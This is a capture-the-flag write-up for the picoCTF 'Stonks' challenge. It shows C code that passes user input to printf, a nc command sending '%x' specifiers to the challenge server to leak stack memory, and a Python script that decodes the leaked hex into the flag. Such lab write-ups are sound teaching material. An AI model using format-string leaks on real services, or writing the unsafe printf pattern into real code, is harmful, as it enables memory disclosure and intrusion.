# URL
https://play.picoctf.org/practice/challenge/105?category=6&page=3

# Challenge
I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure!

# Work
* Looking at the code, something already stands out
```
char *user_buf = malloc(300 + 1);
	printf("What is your API token?\n");
	scanf("%300s", user_buf);
	printf("Buying stonks with token:\n");
	printf(user_buf);
```
* In the code above, the compiler warns us "format not a string literal and no format arguments [-Wformat-security]"
* This means user_buf can include format specifiers like %x, %s, or %n, which printf will interpret directly — potentially allowing us to read memory or crash the program. -> click here to learn more about this [https://owasp.org/www-community/attacks/Format_string_attack]
* For my payload, I decided to use %x -> read stack data.
```
{ echo 1; python3 -c "print('%x' * 30)" ; } | nc mercury.picoctf.net 20195
```
* Sends 1 to select Buy some stonks!, inputs 30 %x format specifiers as the "API token"
* The server prints back stack contents as hexadecimal values, which confirms that a format string vulnerability exists.
```
93b0390804b00080489c3f7eefd80ffffffff193ae160f7efd110f7eefdc7093af180193b037093b03906f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e3534303664303664ff92007df7f2aaf8f7efd440b5e7990010f7d8cce9
```
* The output pasted on RapidTables yields
* <img width="692" height="87" alt="image" src="https://github.com/user-attachments/assets/ebdeeb37-a026-4834-a68a-6eec8034180c" />
* I removed the clutter, which resulted in:
* <img width="740" height="492" alt="image" src="https://github.com/user-attachments/assets/1598c85d-ff39-4f8f-9dcd-81488045d722" />
* Split each output into 4-byte chunks (eg, 6f636970)
```
6f636970
7b465443
306c5f49
345f7435
6d5f6c6c
306d5f79
5f79336e
35343036
64303664
007d
```
* Create a script that takes these inputs and reverses them (change from little endian to big endian)
```
string = []
string = ['6f636970','7b465443',
'306c5f49',
'345f7435',
'6d5f6c6c',
'306d5f79',
'5f79336e',
'35343036',
'64303664',
'007d']

# Convert each hex string to bytes, reverse the bytes, and collect
reversed_bytes = b''.join(bytes.fromhex(s)[::-1] for s in string)

# Decode to ASCII
decoded = reversed_bytes.decode()

print(decoded)
```
* Compile and it will print the flag!

